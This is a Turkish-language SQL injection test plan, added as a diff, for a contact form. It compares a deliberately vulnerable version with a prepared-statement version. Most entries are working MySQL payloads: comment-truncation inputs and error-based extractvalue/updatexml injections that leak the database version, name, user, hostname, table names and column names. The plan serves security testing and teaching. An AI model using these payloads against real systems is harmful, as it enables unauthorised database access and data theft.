@@ -1,0 +1,88 @@
+A) Normal (Kontrol Grubu) — her iki sürümde de başarılı kaydedilmeli
+
+  ┌─────┬──────────────┬────────────────────────────────────┐
+  │  #  │    Adınız    │             Mesajınız              │
+  ├─────┼──────────────┼────────────────────────────────────┤
+  │ 1   │ Ahmet Yılmaz │ Merhaba, formunuz çok güzel olmuş. │
+  ├─────┼──────────────┼────────────────────────────────────┤
+  │ 2   │ Ayşe Demir   │ İletişim için teşekkürler.         │
+  └─────┴──────────────┴────────────────────────────────────┘
+
+  B) Sözdizimi Bozma (SQLi 101) — sadece zayıfta hata, güvende düz metin
+
+  ┌─────┬─────────┬──────────────────┬──────────────────────────────┐
+  │  #  │ Adınız  │    Mesajınız     │       Beklenen (Zayıf)       │
+  ├─────┼─────────┼──────────────────┼──────────────────────────────┤
+  │ 3   │ O'Brien │ tek tırnak testi │ syntax error near 'Brien...' │
+  ├─────┼─────────┼──────────────────┼──────────────────────────────┤
+  │ 4   │ a'      │ b                │ syntax error                 │
+  └─────┴─────────┴──────────────────┴──────────────────────────────┘
+
+  C) Yorum Satırıyla Sorgu Kesme
+
+  #: 5
+  Adınız: hacker', 'pwned')-- -
+  Mesajınız: (boş bırak)
+  Amaç: Sorgu erken kapanır, INSERT yine çalışır ama "isim" kontrolden çıkar
+
+  D) Error-Based Bilgi Sızdırma — raporun "altın tepside bilgi" kısmı
+
+  Adınız alanına aşağıdakileri tek tek yapıştır, Mesajınız boş kalabilir:
+
+  #: 6
+  Adınız (payload): a', (SELECT extractvalue(1, concat(0x7e, version()))))-- -
+  Sızan Bilgi: MySQL versiyonu (örn. ~8.0.36)
+  ────────────────────────────────────────
+  #: 7
+  Adınız (payload): a', (SELECT extractvalue(1, concat(0x7e, (SELECT 
+    database())))))-- -
+  Sızan Bilgi: Aktif veritabanı adı (~bt_test)
+  ────────────────────────────────────────
+  #: 8
+  Adınız (payload): a', (SELECT extractvalue(1, concat(0x7e, 
+  current_user()))))--
+    -
+  Sızan Bilgi: DB kullanıcısı (~root@localhost)
+  ────────────────────────────────────────
+  #: 9
+  Adınız (payload): a', (SELECT extractvalue(1, concat(0x7e, @@hostname))))-- -
+  Sızan Bilgi: Sunucu hostname
+  ────────────────────────────────────────
+  #: 10
+  Adınız (payload): a', (SELECT extractvalue(1, concat(0x7e, (SELECT 
+    GROUP_CONCAT(table_name) FROM information_schema.tables WHERE 
+    table_schema=database())))))-- -
+  Sızan Bilgi: DB'deki tüm tablo isimleri
+  ────────────────────────────────────────
+  #: 11
+  Adınız (payload): a', (SELECT extractvalue(1, concat(0x7e, (SELECT 
+    GROUP_CONCAT(column_name) FROM information_schema.columns WHERE 
+    table_name='mesajlar')))))-- -
+  Sızan Bilgi: mesajlar tablosunun kolonları
+
+  E) UpdateXML alternatifi (extractvalue bloke olursa)
+
+  ┌─────┬────────────────────────────────────────────────────────────┐
+  │  #  │                           Adınız                           │
+  ├─────┼────────────────────────────────────────────────────────────┤
+  │ 12  │ a', (SELECT updatexml(1, concat(0x7e, version()), 1)))-- - │
+  └─────┴────────────────────────────────────────────────────────────┘
+
+  Beklenen Sonuçlar Özeti (rapor tablosu)
+
+  Senaryo: A — Normal giriş
+  Zayıf Sürüm: ✅ Kaydedilir
+  Güvenli Sürüm (Prepared): ✅ Kaydedilir
+  ────────────────────────────────────────
+  Senaryo: B — Tek tırnak
+  Zayıf Sürüm: ❌ SQL hatası
+  Güvenli Sürüm (Prepared): ✅ Düz metin olarak kaydedilir
+  ────────────────────────────────────────
+  Senaryo: C — Yorum kesme
+  Zayıf Sürüm: ⚠️  Manipüle INSERT
+  Güvenli Sürüm (Prepared): ✅ Aynen düz metin saklanır
+  ────────────────────────────────────────
+  Senaryo: D/E — Error-based
+  Zayıf Sürüm: 🔥 DB versiyonu/adı/tabloları sızar
+  Güvenli Sürüm (Prepared): ✅ Hiçbir şey sızmaz, payload metin olarak
+  kaydedilir
